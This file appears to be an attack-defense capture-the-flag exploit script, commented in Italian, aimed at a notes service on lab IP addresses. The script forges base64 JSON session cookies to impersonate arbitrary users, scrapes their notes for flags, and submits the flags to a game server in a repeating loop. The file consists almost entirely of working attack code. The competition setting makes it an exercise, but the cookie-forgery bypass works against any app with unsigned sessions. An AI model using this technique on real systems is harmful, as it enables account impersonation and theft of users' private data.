import requests
import json
import time
import base64
import re 

#! --- inserimento shit qui ---

TEAM_TOKEN = '' #!Ricorda da cambiare

TARGET_TEAMS = [f"10.27.27.{i}" for i in range(11,15) if i not in [12]]

PORT_API = '5000' #porta a cui inviare lo sploit 

#Prima lo script collezionava le flag di tutti i team e poi li inviava tutti in una botta, mo che le prendeva tutte metà sono già scadute
#Ora lo script attacca CHUNK_SIZE team alla volta e invia le loro flag fino alla fine 

CHUNK_SIZE = 10  

MAX_TIMEOUT = 8 #self explanatory direi, non si applica per il get di flag_ids.
#! ------------------------------------------

FLAG_IDS_URL = 'http://10.27.27.10/api/client/attack_data'
SUBMIT_URL = 'http://10.27.27.10:8080/flags'

def debug(msg, status="INFO"): #?Questa funzione è solo per scopi estetici così il terminale è colorato
    colors = {"INFO": "\033[94m", "OK": "\033[92m", "ERR": "\033[91m", "WARN": "\033[93m", "END": "\033[0m"}
    print(f"{colors.get(status, '')}[{status}] {msg}{colors['END']}")

if TEAM_TOKEN=="":
    debug("NON HAI SETTATO IL TEAM TOKEN COGLIONE", "WARN") #you never know someone might forget

def submit_flags(flags_to_send):
    
    if not flags_to_send:
        return
    debug(f"Sottomissione di {len(flags_to_send)} flag...", "INFO")
    try:
        res = requests.put(SUBMIT_URL, 
                           headers={'X-Team-Token': TEAM_TOKEN}, 
                           data=json.dumps(flags_to_send), 
                           timeout=10)
        debug(f"Risposta server: {res.text}", "OK")
    except Exception as e:
        debug(f"Errore sottomissione: {e}", "ERR")

def exploit_team(team_id, user_ids, current_chunk_flags):
    team_ip = f"{team_id}" 
    debug(f"Attacco Team {team_id} ({team_ip})...", "INFO")
    
    for username in user_ids:  # username direttamente dalla lista
        try:
            # Creare JSON {"user": "username"} e convertire in base64
            payload = {"user": username}
            json_str = json.dumps(payload)
            b64_session = base64.b64encode(json_str.encode()).decode()
            
            # Fare richiesta GET a /my-shporas con il cookie secure_session
            cookies = {'secure_session': b64_session}
            resp = requests.get(f"http://{team_ip}:{PORT_API}/my-shporas", 
                               cookies=cookies, 
                               timeout=MAX_TIMEOUT)
            
            if resp.status_code == 200:
                # Cercare il link specifico <a href="/shpora?id=...">
                # Pattern: /shpora?id= 
                href_match = re.search(r'<a\s+href="(/shpora\?id=[^"]+)"', resp.text, re.IGNORECASE)
                
                if href_match:
                    shpora_path = href_match.group(1)
                    shpora_url = f"http://{team_ip}:{PORT_API}{shpora_path}"
                    
                    debug(f"Seguendo link: {shpora_url}", "INFO")
                    
                    # Seguire il link della nota vera
                    shpora_resp = requests.get(shpora_url, cookies=cookies, timeout=MAX_TIMEOUT)
                    
                    if shpora_resp.status_code == 200:
                        # Rimuovere i tag HTML e spazi/newline per evitare di catturare attributi
                        content = re.sub(r'<[^>]+>', ' ', shpora_resp.text)
                        content = re.sub(r'\s+', ' ', content)
                        
                        
                        debug(f"Contenuto (first 300 chars): {content[:300]}", "INFO")
                        
                        # Cercare stringhe FLAG vere che terminano con = (solo maiuscole e numeri)
                        # Pattern: [A-Z0-9]{31,}= come nell'esempio
                        matches = re.findall(r'[A-Z0-9]{31,}=', content)
                        
                        debug(f"Trovati {len(matches)} flag valide", "INFO")
                        if matches:
                            for i, m in enumerate(matches):
                                debug(f"  Flag {i}: {m}", "INFO")
                        
                        for flag in matches:
                            if flag not in current_chunk_flags:
                                debug(f"Flag catturata: {flag}", "OK")
                                current_chunk_flags.append(flag)
                                break  # Prendi solo la prima
                else:
                    debug(f"Nessun link trovato per {username}", "WARN")
        except Exception as e:
            debug(f"Errore exploitation per {username}: {e}", "ERR")
            continue

def main():
    try:
        r = requests.get(FLAG_IDS_URL, timeout=5)
        all_targets = r.json().get("shporas", {})
    except Exception as e:
        debug(f"Errore caricamento target: {e}", "ERR") #(╯°□°）╯︵ ┻━┻ 
        return

    captured_chunk = []
    
    
    for index, team_id in enumerate(TARGET_TEAMS, start=1):
        team_data = all_targets.get(team_id)
        print(team_data)
        if team_data:
            exploit_team(team_id, team_data, captured_chunk)
    
    # Invia tutte le flag accumulate in un'unica richiesta
    if captured_chunk:
        debug(f"Invio {len(captured_chunk)} flag totali...", "INFO")
        submit_flags(captured_chunk)

if __name__ == "__main__":
    while True:
        main()
        print("And now we wait...")
        for i in range(0,60):
            print(f"{(60-i)} secondi rimanenti")
            time.sleep(1)